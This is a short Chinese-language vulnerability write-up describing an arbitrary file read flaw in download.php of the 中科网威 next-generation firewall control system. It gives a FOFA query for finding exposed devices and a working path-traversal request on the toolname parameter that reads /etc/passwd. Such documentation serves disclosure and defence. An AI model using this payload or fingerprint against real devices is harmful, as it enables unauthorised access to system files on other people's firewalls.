---
title: 中科网威 下一代防火墙控制系统 download.php 任意文件读取漏洞
date: 2021-09-23 23:55:51
tags: PeiQi文库
categories:
 - 网络设备漏洞
 - 中科网威
---

# 中科网威 下一代防火墙控制系统 download.php 任意文件读取漏洞

## 漏洞描述

中科网威 下一代防火墙控制系统 download.php 任意文件读取漏洞, 攻击者通过漏洞可以读取服务器上的文件

## 漏洞影响

> [!NOTE]
>
> 中科网威 下一代防火墙控制系统

## FOFA

> [!NOTE]
>
> body="Get_Verify_Info(hex_md5(user_string)."

## 漏洞复现

登录页面如下

![image-20210531184103009](/img/20210924020235915488.png)

漏洞存在于 download.php

![image-20210602161941678](/img/20210924020237027246.png)

任意点击后抓包，更改 **toolname** 参数

```
/download.php?&class=vpn&toolname=../../../../../../../../etc/passwd
```

![image-20210602162110747](/img/20210924020237807580.png)

## Goby & POC

![image-20210602162300324](/img/20210924020238117826.png)